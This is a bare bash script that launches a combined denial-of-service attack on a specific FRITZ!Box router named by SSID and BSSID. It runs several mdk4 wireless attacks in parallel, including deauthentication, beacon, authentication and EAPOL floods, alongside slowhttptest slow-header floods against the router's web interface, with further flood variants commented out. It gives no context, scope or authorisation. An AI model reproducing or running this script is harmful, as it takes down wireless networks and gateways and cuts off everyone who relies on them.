#!/bin/env bash

TIMEOUT=60
SSID="FRITZ\!Box 7590 YI"
BSSID="50:E6:36:DA:B7:90"
GATEWAY="http://192.168.178.1"

sudo airmon-ng start wlan0 1

sudo mdk4 wlan0mon a &
sudo mdk4 wlan0mon b &
sudo mdk4 wlan0mon d &
sudo mdk4 wlan0mon e -t $BSSID &
sudo mdk4 wlan0mon f -s a -m s -p 1000 &
sudo mdk4 wlan0mon m -t $BSSID &
sudo mdk4 wlan0mon w -e $SSID &

slowhttptest -H -c 65539 -l $TIMEOUT -u $GATEWAY &
# slowhttptest -B -c 65539 -l $TIMEOUT -u $GATEWAY &
# slowhttptest -R -c 65539 -l $TIMEOUT -u $GATEWAY &
# slowhttptest -X -c 65539 -l $TIMEOUT -u $GATEWAY &
# wrk $GATEWAY -c 100000 -d 60 -t 4 &

sleep $TIMEOUT

sudo pkill mdk4
sudo pkill wrk
sudo pkill slowhttptest 

sudo airmon-ng stop wlan0mon
